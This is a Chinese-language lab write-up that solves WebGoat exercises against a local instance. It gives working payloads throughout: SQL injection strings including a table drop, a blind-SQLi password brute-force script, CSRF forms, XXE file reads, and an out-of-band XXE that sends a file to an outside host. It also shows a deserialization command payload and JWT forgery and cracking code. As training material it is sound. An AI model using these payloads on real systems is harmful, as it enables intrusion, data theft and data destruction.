---
title: "WebGoat"
weight: 4
bookToc: true
---

## 环境

使用Docker快速搭建`WebGoat`靶场环境，[https://github.com/WebGoat/WebGoat](https://github.com/WebGoat/WebGoat)
```bash
docker run -d --name webgoat -p 8080:8080 -p 9090:9090 webgoat/webgoat
```

部署完后访问 [http://localhost:8080/WebGoat](http://localhost:8080/WebGoat)，随便注册一个用户

使用的是2025.3版本


## A1 Broken Access Control

### Hijack a session

**目标：通过预测`hijack_cookie`的值，获取其他已认证用户的会话。**

`Proxy`->`HTTP history`->`Send to Repeater`

![](/data/image/security/exploit/webgoat/A1/hijack/1.png)

删除`Cookie`头中的`hijack_cookie`，发送2次，得到`hijack_cookie`的值分别是
```
hijack_cookie=6870830967335141386-1768376122121
hijack_cookie=6870830967335141387-1768376130183
```

推测出来`hijack_cookie`可能前半部分是个随机数，后半部分是个时间戳。

**那么中间缺失的`xxxx-1768376122121`/`xxxx-1768376130183`可能代表其他已认证用户的会话。**

右键`Send to Intruder`，`Payloads`选择`Numbers`，`From xxx to xxx`，`Start attack`

TODO

`Sequencer`分析得出结论`extremely poor`

![](/data/image/security/exploit/webgoat/A1/hijack/0.png)

### Insecure Direct Object References

先以`tom/cat`登录

![](/data/image/security/exploit/webgoat/A1/idor/image-1.png)

找请求和页面显示的差异，可能收获一些信息 `role,userId`

![](/data/image/security/exploit/webgoat/A1/idor/image.png)

推测访问profile的REST API风格，为 `WebGoat/IDOR/profile/2342384`

![](/data/image/security/exploit/webgoat/A1/idor/image-2.png)

`Send to Intruder`爆破其他人的profile
![](/data/image/security/exploit/webgoat/A1/idor/image-3.png)

爆破成功其他id为`2342388`
![](/data/image/security/exploit/webgoat/A1/idor/image-4.png)

同样的路径，方法改为PUT，修改其他人的profile，将`role`修改为`0`（一般数字低的代表管理员等高权限），`color`改为`red`
![](/data/image/security/exploit/webgoat/A1/idor/image-5.png)


### Missing Function Level Access Control

基于`hidden`搜索找到页面中隐藏的菜单项，得到：
- Users: `access-control/users-admin-fix`
- Config: `access-control/config`
![](/data/image/security/exploit/webgoat/A1/missingac/image.png)

**要求获得用户列表信息，并提交`Jerry`这个账户的hash**

推测用户列表对应的endpoint是`access-control/users`，注意`Content-Type: application/json`，得到hash`SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`
![](/data/image/security/exploit/webgoat/A1/missingac/image-2.png)

然后假定上面的问题被修复了，对应`access-control/users-admin-fix`，该接口只能被管理员用户访问，**再一次要求获得用户列表信息，并提交`Jerry`这个账户的hash**

根据提示需要先创建管理员用户，用户名需要和当前登录的webgoat用户名保持一致，`POST access-control/users`
```json
{"username":"your-webgoat-user", "password":"", "admin": "true"}
```
![](/data/image/security/exploit/webgoat/A1/missingac/3.png)

通过`access-control/users-admin-fix`接口获得hash`SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`
![](/data/image/security/exploit/webgoat/A1/missingac/4.png)

### Spoofing an Authentication Cookie

目标：猜测认证cookie是怎么生成的，尝试以`Tom`登录

![](/data/image/security/exploit/webgoat/A1/spoof/image.png)

根据提示以`admin`/`webgoat`2个账号登录，得到以下cookie，发现cookie不会变，且base64编码有相同得前缀，长度似乎与用户名长度有关
```
admin:   NDU2MTZkNDY2YjRiNmM2OTczNGE2ZTY5NmQ2NDYx
webgoat: NDU2MTZkNDY2YjRiNmM2OTczNGE3NDYxNmY2NzYyNjU3Nw==
```

得到以下解码逻辑，`nimda`为`rev(admin)`，`taogbew`为`rev(webgoat)`
![](/data/image/security/exploit/webgoat/A1/spoof/image-1.png)

![](/data/image/security/exploit/webgoat/A1/spoof/image-2.png)

得到`Tom`的cookie为`NDU2MTZkNDY2YjRiNmM2OTczNGE2ZDZmNTQ=`

![](/data/image/security/exploit/webgoat/A1/spoof/image-3.png)

![](/data/image/security/exploit/webgoat/A1/spoof/image-4.png)


## A2 Cryptographic Failures

### Crypto Basics

#### Base64

![](/data/image/security/exploit/webgoat/A2/base64/image-1.png)

![](/data/image/security/exploit/webgoat/A2/base64/image.png)

---

#### XOR

使用 [https://strelitzia.net/wasXORdecoder/wasXORdecoder.html](https://strelitzia.net/wasXORdecoder/wasXORdecoder.html) 进行 IBM WebSphere 的 xor encoding/decoding，得到`databasepassword`

![](/data/image/security/exploit/webgoat/A2/xor/image.png)

---

#### hash

找hash对应的原文密码

![](/data/image/security/exploit/webgoat/A2/hash/image.png)

md5 16字节，sha256 32字节
```bash
hashcat 5F4DCC3B5AA765D61D8327DEB882CF99 # 提示md5 m 0
hashcat -m 0 -a 0 5F4DCC3B5AA765D61D8327DEB882CF99 /usr/share/wordlists/rockyou.txt.gz
5f4dcc3b5aa765d61d8327deb882cf99:password

hashcat 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918 # 提示sha2-256 m 1400
hashcat -m 1400 -a 0 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918 /usr/share/wordlists/rockyou.txt.gz

8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin
```

#### signatures

![](/data/image/security/exploit/webgoat/A2/sign/image.png)

将私钥保存成`pri.pem`使用`openssl`相关命令完成

```bash
openssl rsa -in pri.pem -noout -modulus
Modulus=AE82CF5DC1EA1117D4C81C9E3DC4A520F187D481B709FC7752F35B156C3DB114EEA7DAF056966C3AF75B7A3C325645BEAC2E40F418952F5CA99BF0669E923DB1ACD4387E65F640A278ACF4C6A677A663C47C5BB06C09C6BBC40993E4E04099EDFCC9C98E15726EDBD254EA101557553D8F9A40B6F6C199BA2D9C6C226C38DB8A31DC284527903F9B580CF23AF41A18CB81FA7B65361BFF4BBD12709B2A157E8EAC373566C118051F43F39229FDE30C311ADD4C81C85E6C475AA7948720C0A3E732381DDE2777899B075029DB0AD96004ABCAE978631C3BF7CF48BE5491FA2BA7E7B7F934932AF82367EF64409EA9A5859D5C1A2B0F37B30F894407CE89941933

echo -n "AE82CF5DC1EA1117D4C81C9E3DC4A520F187D481B709FC7752F35B156C3DB114EEA7DAF056966C3AF75B7A3C325645BEAC2E40F418952F5CA99BF0669E923DB1ACD4387E65F640A278ACF4C6A677A663C47C5BB06C09C6BBC40993E4E04099EDFCC9C98E15726EDBD254EA101557553D8F9A40B6F6C199BA2D9C6C226C38DB8A31DC284527903F9B580CF23AF41A18CB81FA7B65361BFF4BBD12709B2A157E8EAC373566C118051F43F39229FDE30C311ADD4C81C85E6C475AA7948720C0A3E732381DDE2777899B075029DB0AD96004ABCAE978631C3BF7CF48BE5491FA2BA7E7B7F934932AF82367EF64409EA9A5859D5C1A2B0F37B30F894407CE89941933" > msg.txt

openssl dgst -sha256 -sign pri.pem -out sig.bin msg.txt

openssl base64 -A -in sig.bin
mRULPa7Mv/u7OWJBL78T/dHgz5Up6ai1Jg1lsK0lf2o+/QjEAVTfBsLr9gFUJOvP5pu94NkhoS/sfPAug5t9Pw7ZsHFhRxEnCQKIlUVgd02hGimK7MfwK+UCQoAdDSUDmHQpAF/sqMbypAnrStb14MC0pBj+OpJgaC5e2ldOVzg7EX471hhXgBLR0pK/Fl+u8IQXqJvkLyibshD5L+t4ZIl1I3D1SK5LJqJXWny1X17Ce8ShbNkoP3Zi2P4xeSmxzAhuu6jrJafigRiYFIxjLFZavuh6+5q9uuBEhaauO5IA6Vm0ecQd1/keW6npXzzuQ73XQ/aNdZ0u7fv5jVVsvw==
```

### password

通过容器中泄露的密钥解密密文

![](/data/image/security/exploit/webgoat/A2/password/image.png)

```bash
docker run -d webgoat/assignments:findthesecret
755a6d9d7f8e1a44c2cf243313ca999f2f0295e428289809f63cebd927c05a93

docker exec -it 755a6d9d7f8e /bin/bash
webgoat@755a6d9d7f8e:/$ cd /root
bash: cd: /root: Permission denied

docker exec -u root -it 755a6d9d7f8e  /bin/bash
root@755a6d9d7f8e:/# cd /root
root@755a6d9d7f8e:~# ls
default_secret
root@755a6d9d7f8e:~# cat default_secret
ThisIsMySecretPassw0rdF0rY0u
root@755a6d9d7f8e:~# echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -kfile default_secret
Leaving passwords in docker images is not so secure
```

## A3 injection

### SQL Injection (intro)

SQL
![](/data/image/security/exploit/webgoat/A3/sqli-intro/image.png)

DML
![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-1.png)

DDL
![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-2.png)

DCL

{{< hint info >}}
`@'%'`是MySQL专用的`user@host`模型，这里用户名要当 `identifier` 用，而不是`'string literal'`
{{< /hint >}}

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-3.png)

---

String SQL injection

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-4.png)

Numeric SQL injection

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-5.png)

---

SQLi - Compromising Confidentiality

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-6.png)

SQLi - Compromising Integrity

`' or '1'='1';update employees set salary = 99999 where auth_tan = '3SL99A' -- `

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-7.png)

SQLi - Compromising Availability

`1'; drop table access_log;-- `
![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-8.png)

![](/data/image/security/exploit/webgoat/A3/sqli-intro/image-9.png)

### SQL Injection (advanced)

union select

![](/data/image/security/exploit/webgoat/A3/sqli-advanced/image.png)


---

发现注册接口`username_req`参数存在SQL注入，但是用sqlmap爆不出来信息

![](/data/image/security/exploit/webgoat/A3/sqli-advanced/image-2.png)

编写以下代码爆破密码，为`thisisasecretfortomonly`
```python
import requests
import json 

headers = {
    "Cookie": "JSESSIONID=7280048EA36A3C5D2C38E2D976D5B62E; spoof_auth=NDU2MTZkNDY2YjRiNmM2OTczNGE3NDYxNmY2NzYyNjU3Nw==",
}

data = {
    "username_reg": "Tom",
    "email_reg": "123@123.com",
    "password_reg": "123",
    "confirm_password_reg": "123",
}

password = ''
password_index = 0  

alphabet = 'abcdefghijklmnopqrstuvwxyz'

count = 0

while True:

    for c in alphabet:
        payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, c)
        data["username_reg"] = payload
        
        r = requests.put('http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register', headers=headers, data=data)
        resp = json.loads(r.text)
        if 'already exists' in resp['feedback']:
          password += c
          password_index += 1
          count += 1

          print(password)
          exit
    
    if count > 32:
       break
```

![](/data/image/security/exploit/webgoat/A3/sqli-advanced/image-1.png)

### SQL Injection (mitigation)

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image.png)

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-1.png)

---

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-2.png)

`/SqlInjectionMitigations/attack` -> `/SqlOnlyInputValidation/attack`

校验不能包含空格

`userid_sql_only_input_validation=zqq'/**/union/**/select/**/userid,user_name,password,cookie,'5','6',7/**/from/**/user_system_data/**/--/**/`

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-6.png)

---

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-3.png)

`/SqlInjectionMitigations/attack` -> `/SqlOnlyInputValidationOnKeywords/attack`

校验不能包含空格和select/from关键字

`userid_sql_only_input_validation_on_keywords=zqq'/**/union/**/sselectelect/**/userid,user_name,password,cookie,'5','6',7/**/frfromom/**/user_system_data/**/--/**/`

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-5.png)

---

下面这页是在说，order by 直接像下面这样使用prepareStatement是没有意义的
```
SELECT * FROM t ORDER BY ?
数据库会把 ? 当成一个“值”，ORDER BY 'created_at'，这对所有行都是同一个常量，排序没有意义
order by 后面需要跟的是列的名字
```

如果想给order by 加一些动态的属性，可以使用`CASE`
```
SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)
```

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/image-4.png)

---

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/1.png)

order by 存在sql注入，报错得到执行语句`select id, hostname, ip, mac, status, description from SERVERS where status <> 'out of order' order by id'`

![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/2.png)

可以使用上面的`case when then else end`，判断when的条件是否成立，是否成立会决定实际参与排序的列，页面响应会发生变化，以此实现`webgoat-prd`的`ip`前3位的判断

`case when((select substring(ip,3,1) from SERVERS where hostname = 'webgoat-prd') ='4') then id else hostname end`

响应按照`hostname`进行排序，说明`webgoat-prd`的`ip`第三位不为`5`
![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/3.png)

响应按照id进行排序，说明`webgoat-prd`的`ip`第三位为`4`
![](/data/image/security/exploit/webgoat/A3/sqli-mitigation/4.png)

以此类推，可得ip为`104.130.219.202`

### Cross Site Scripting

假设`hijack_cookie`存在，此cookie是非`http-only`的，才能通过js展示

![](/data/image/security/exploit/webgoat/A3/xss/image.png)

Reflected XSS
![](/data/image/security/exploit/webgoat/A3/xss/image-1.png)
{{< hint info >}}
这里需要构造成一个连接让受害者点击才能变成Reflected XSS不然是Self XSS
{{< /hint >}}

找到遗留测试代码的路由 `start.mvc#test/`
![](/data/image/security/exploit/webgoat/A3/xss/image-2.png)

遗留测试代码逻辑是将`test/:param`参数作为`html`进行展示
![](/data/image/security/exploit/webgoat/A3/xss/image-3.png)

DOM XSS，执行`webgoat.customjs.phoneHome()`
![](/data/image/security/exploit/webgoat/A3/xss/image-4.png)

![](/data/image/security/exploit/webgoat/A3/xss/image-5.png)

{{< hint info >}}
可以理解DOM XSS 是一种特殊的 Reflected XSS，不经过服务器
{{< /hint >}}

### Cross Site Scripting (stored)

存储型 XSS不需要通过构造链接点击触发

![](/data/image/security/exploit/webgoat/A3/xss-stored/image.png)

![](/data/image/security/exploit/webgoat/A3/xss-stored/image-1.png)

### Cross Site Scripting (mitigation)

![](/data/image/security/exploit/webgoat/A3/xss-mitigation/image.png)

参看 [https://owasp.org/www-project-java-encoder/](https://owasp.org/www-project-java-encoder/)中的`Legacy Servlet Spec`部分

![](/data/image/security/exploit/webgoat/A3/xss-mitigation/image-1.png)

![](/data/image/security/exploit/webgoat/A3/xss-mitigation/image-2.png)

参看 [https://wiki.owasp.org/index.php/Category:OWASP_AntiSamy_Project#tab=How_do_I_get_started_3F](https://wiki.owasp.org/index.php/Category:OWASP_AntiSamy_Project#tab=How_do_I_get_started_3F)


### Path traversal

修改test参数

![](/data/image/security/exploit/webgoat/A3/path/image.png)

![](/data/image/security/exploit/webgoat/A3/path/image-1.png)

![](/data/image/security/exploit/webgoat/A3/path/image-2.png)

---

修复为移除`../`，双写
![](/data/image/security/exploit/webgoat/A3/path/image-3.png)

---

修复为忽略用户传的`full name`，对文件名进行修改

![](/data/image/security/exploit/webgoat/A3/path/image-4.png)

---

读文件

![](/data/image/security/exploit/webgoat/A3/path/image-5.png)

返回404会显示当前目录中的文件

![](/data/image/security/exploit/webgoat/A3/path/image-6.png)

最终找到路径，`/home/webgoat/.webgoat-2025.3/PathTraversal/cats/../../path-traversal-secret.jpg`

![](/data/image/security/exploit/webgoat/A3/path/image-7.png)

![](/data/image/security/exploit/webgoat/A3/path/image-8.png)

让提交当前webgoat登录用户名的sha512值

![](/data/image/security/exploit/webgoat/A3/path/image-9.png)

---

解压缩时存在路径的拼接

```bash
mkdir -p /home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq

cd /home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq

curl -o zqqqqq.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png

zip profile.zip ../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq/zqqqqq.jpg

zipinfo profile.zip
Archive:  profile.zip
Zip file size: 6271 bytes, number of entries: 1
-rw-r--r--  3.0 unx     5953 bx stor 26-Jan-16 13:56 ../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq/zqqqqq.jpg
1 file, 5953 bytes uncompressed, 5953 bytes compressed:  0.0%
```

![](/data/image/security/exploit/webgoat/A3/path/image-10.png)

![](/data/image/security/exploit/webgoat/A3/path/image-11.png)

可以使用`getCanonicalPath`获得规范化后的绝对路径

## A5 Security Misconfiguration

### Cross-Site Request Forgeries

```html
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
</form>
```

![](/data/image/security/exploit/webgoat/A5/csrf/image.png)

![](/data/image/security/exploit/webgoat/A5/csrf/image-1.png)

---

```html
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://localhost:8080/WebGoat/csrf/review">
    <input type="hidden" id="reviewText" name="reviewText" placeholder="Add a Review" type="text" value="on behalf">
    <input type="hidden" id="reviewStars" name="stars" type="text" value="1">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    <input type="submit" name="submit" value="Submit review">
</form>
```

![](/data/image/security/exploit/webgoat/A5/csrf/image-2.png)

![](/data/image/security/exploit/webgoat/A5/csrf/image-3.png)

![](/data/image/security/exploit/webgoat/A5/csrf/image-4.png)

---

这里主要是通过表单提交的方式，在请求体里构造json字符串，参看[https://pentestmonkey.net/blog/csrf-xml-post-request](https://pentestmonkey.net/blog/csrf-xml-post-request)，通过`enctype="text/plain"`，将`=`号包进json里

```html
<form name="feedback" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST">
    <input type="hidden" name='{"name":"2","email":"2' value='2@2.com","subject":"service","message":"2"}'>
</form>
<script>document.feedback.submit();</script>
```
![](/data/image/security/exploit/webgoat/A5/csrf/image-6.png)

---

这里是想说让受害者登录攻击者的账号，用于收集登陆后的一些活动信息

```html
<form name="login" action="http://localhost:8080/WebGoat/login" method="POST">
    <input type="hidden" name='username' value='csrf-zqqqqq'>
    <input type="hidden" name='password' value='123456'>
</form>
<script>document.login.submit();</script>
```
![](/data/image/security/exploit/webgoat/A5/csrf/image-5.png)


### XXE

![](/data/image/security/exploit/webgoat/A5/xxe/image.png)

服务器端存的时候就会被替换了
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
  <!ENTITY js SYSTEM "file:///etc/passwd">
]>
<comment><text>&js;</text></comment>
```

![](/data/image/security/exploit/webgoat/A5/xxe/image-1.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-2.png)

---

没有限制只能是json，传xml也可以

![](/data/image/security/exploit/webgoat/A5/xxe/1.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-3.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-4.png)

---

DoS 构造了一个指数级增长的情况

![](/data/image/security/exploit/webgoat/A5/xxe/image-5.png)

---

XXE Out-of-band 外带数据 参看[https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///home/webgoat/.webgoat-2025.3/XXE/csrf-zqqqqq/secret.txt">

  <!ENTITY % dtd SYSTEM
  "http://xxx.226:12345/evil.dtd">

  %dtd;
]>

<comment><text>&send;</text></comment>
```

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxx.226:12345/?collect=%file;'>">
%all;
```

![](/data/image/security/exploit/webgoat/A5/xxe/image-7.png)

![](/data/image/security/exploit/webgoat/A5/xxe/image-6.png)


## A6 Vuln & Outdated Components

### Vulnerable Components

**Open source components are the new attack vector.**

![](/data/image/security/exploit/webgoat/A6/image.png)

![](/data/image/security/exploit/webgoat/A6/image-1.png)

```xml
<contact class='dynamic-proxy'>
<interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>pwd</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
```
![](/data/image/security/exploit/webgoat/A6/image-2.png)

## A7 Identity & Auth Failure

### Authentication Bypasses

![](/data/image/security/exploit/webgoat/A7/bypass/image.png)

![](/data/image/security/exploit/webgoat/A7/bypass/image-1.png)

相关代码如下，绕过要求就是包含`secQuestion`的参数需要是2个，但不能是`secQuestion0/secQuestion1`：
```java
  private HashMap<String, String> parseSecQuestions(HttpServletRequest req) {
    Map<String, String> userAnswers = new HashMap<>();
    List<String> paramNames = Collections.list(req.getParameterNames());
    for (String paramName : paramNames) {
      // String paramName = req.getParameterNames().nextElement();
      if (paramName.contains("secQuestion")) {
        userAnswers.put(paramName, req.getParameter(paramName));
      }
    }
    return (HashMap) userAnswers;
  }

  public boolean verifyAccount(Integer userId, HashMap<String, String> submittedQuestions) {
    // short circuit if no questions are submitted
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion0")
        && !submittedQuestions
            .get("secQuestion0")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion1")
        && !submittedQuestions
            .get("secQuestion1")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
      return false;
    }

    // else
    return true;
  }

  public boolean didUserLikelylCheat(HashMap<String, String> submittedAnswers) {
    boolean likely = false;

    if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) {
      likely = true;
    }

    if ((submittedAnswers.containsKey("secQuestion0")
            && submittedAnswers
                .get("secQuestion0")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion0")))
        && (submittedAnswers.containsKey("secQuestion1")
            && submittedAnswers
                .get("secQuestion1")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion1")))) {
      likely = true;
    } else {
      likely = false;
    }

    return likely;
  }
```

![](/data/image/security/exploit/webgoat/A7/bypass/image-2.png)


### Insecure Login

![](/data/image/security/exploit/webgoat/A7/login/image.png)

### JWT tokens

![](/data/image/security/exploit/webgoat/A7/jwt/image-4.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-1.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-2.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-3.png)

---

![](/data/image/security/exploit/webgoat/A7/jwt/image-5.png)

---

```bash
hashcat -m 16500 -a 0 "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2ODc5MzQ0NiwiZXhwIjoxNzY4NzkzNTA2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.MLzT-gqBUZB8YgtGBLSNYYy4fHqQcm5tIFZ9MTefXFE" /usr/share/wordlists/rockyou.txt.gz

...
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc2ODc5MzQ0NiwiZXhwIjoxNzY4NzkzNTA2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.MLzT-gqBUZB8YgtGBLSNYYy4fHqQcm5tIFZ9MTefXFE:business
...
```

![](/data/image/security/exploit/webgoat/A7/jwt/image-6.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-7.png)

---

进入页面得到`Jerry`的用户和密码，和`"refresh_token" : "hBAkHBkBDUjZFFSwNZST"`（这里`refresh_token`在获得新的`access_token`后就失效了）

![](/data/image/security/exploit/webgoat/A7/jwt/image-8.png)

根据提示：要使用`Jerry`的`refresh_token`用于生成`Tom`的`access_token`

![](/data/image/security/exploit/webgoat/A7/jwt/image-10.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-11.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-12.png)


使用日志中`Tom`旧的`access_token`和`Jerry`的`refresh_token`，得到新的`Tom`的`access_token`

![](/data/image/security/exploit/webgoat/A7/jwt/image-9.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-13.png)

---

![](/data/image/security/exploit/webgoat/A7/jwt/image-15.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-14.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-16.png)

攻击思路：自己提供签名并将jwks服务替换成自己的

首先生成公私钥对：
```bash
openssl genrsa -out jwt_rsa.key 2048
openssl rsa -in jwt_rsa.key -pubout -out jwt_rsa.pub
```

生成jwt的签名代码如下：
```python
import jwt, time

private_key = open("jwt_rsa.key", "rb").read()

now = int(time.time())
payload = {
  "Email" : "tom@webgoat.com",
  "Role" : [ "Cat" ],
  "aud" : "webgoat.org",
  "iat": now,
  "exp": now + 3600,
  "iss" : "WebGoat Token Builder",
  "sub" : "tom@webgoat.com",
  "username" : "Tom"
}

headers = {
    "typ": "JWT",
    "alg": "RS256",
    "jku": "http://xxx:12345/jwks.json"
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)

# python jwt_gen.py
# eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly82Ny4yMzAuMTg4LjIyNjoxMjM0NS9qd2tzLmpzb24iLCJ0eXAiOiJKV1QifQ.eyJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il0sImF1ZCI6IndlYmdvYXQub3JnIiwiaWF0IjoxNzY4ODA3NDUxLCJleHAiOjE3Njg4MTEwNTEsImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsInN1YiI6InRvbUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIn0.GpTT8-9wKNLeEGyOvWUJfqztLxEnMQCY3rcRCSIGWWj28iabQUBqJ_bDXHAGncKAsWKzXmM-umf9GZ7e_4Lv50AKDf6x6IwwfSDVNpcZkMirQ4Bp3XiNVsR5ukcde8zlRlGcoqwuIaKBEa3bi3JYw8gz5W__L59UbQiguXe2SpUomP5i2lTWdpNwr1IKzbsvd_Zfx_2cZdWSDpGvpa-XfTL4ocvtKaL53BX9C2N_YkGPeKJmFGSpN4y6vgAvAcoa9mXsCSRG7rVandAOYE7miSjoCJrWumpq3k6xDOBLxqlkJyv2pwRR1iBGeqhIlnJswm3wUDRfnIkGg1abNGENPQ
```

![](/data/image/security/exploit/webgoat/A7/jwt/image-17.png)

提取n，然后base64url编码

jwks文件格式如下：
```json
{
  "keys": [
    {
      "alg": "RS256",
      "e": "AQAB",
      "n": "rVbPLWNqjR3vXLXVOVYZXp524qzZk-nMWLEA9lzajdIoWhqstnpy55j652rwKCbJZx7z4b8AE6yFuDje1YHQJCW5qEMcqeF6J9BN1t_QH8ynMk4BB_UAVAkUgRCua-TSYeBYxxrGNzR1wN4XxODeIlbCNyaVtovjWGwvzVJ-IZMscuR-BBHAaDiTVothnM5eNtmeB-A10nycDjm5-tPr7XdN9-LC42o3BdWEZuKfNDf2Hwg8JOzIdqCQH5uIyCM_bSydfsaiSdYzBOWvLw5Nkbzmv2lJ_OrKZkQbyIKDmhPIcEVK7IoDySWACsh1cofL3yGzn_GxmMuG3-M6k9MWEw",
      "kid": "70e0ed3c",
      "kty": "RSA",
      "use": "sig"
    }
  ]
}
```

![](/data/image/security/exploit/webgoat/A7/jwt/image-18.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-19.png)

{{< hint info >}}
相较于base64 ，base64url的替换规则是：
- `+` → `-`
- `/` → `_`
- 末尾的 `=` 去掉
{{< /hint >}}

---

![](/data/image/security/exploit/webgoat/A7/jwt/image-20.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-21.png)

![](/data/image/security/exploit/webgoat/A7/jwt/image-22.png)

```python
import jwt, time

now = int(time.time())
payload = {
  "Email" : "tom@webgoat.com",
  "Role" : [ "Cat" ],
  "aud" : "webgoat.org",
  "iat": now,
  "exp": now + 3600,
  "iss" : "WebGoat Token Builder",
  "sub" : "tom@webgoat.com",
  "username" : "Tom"
}

headers = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "' union select 'MTIzNDU2' from jwt_keys -- "
}

# base64(123456)=MTIzNDU2
token = jwt.encode(payload, '123456', algorithm="HS256", headers=headers)
print(token)
```

### Password reset

![](/data/image/security/exploit/webgoat/A7/reset/image.png)

![](/data/image/security/exploit/webgoat/A7/reset/image-1.png)

---

![](/data/image/security/exploit/webgoat/A7/reset/image-2.png)

---

有强调tom会立刻访问reset link，所以reset link指向能自己控制的地方，发现Host header会影响link的生成，将link生成到WebWolf

![](/data/image/security/exploit/webgoat/A7/reset/image-3.png)

![](/data/image/security/exploit/webgoat/A7/reset/image-4.png)

![](/data/image/security/exploit/webgoat/A7/reset/image-5.png)

![](/data/image/security/exploit/webgoat/A7/reset/image-6.png)

### Secure Passwords

![](/data/image/security/exploit/webgoat/A7/password/image.png)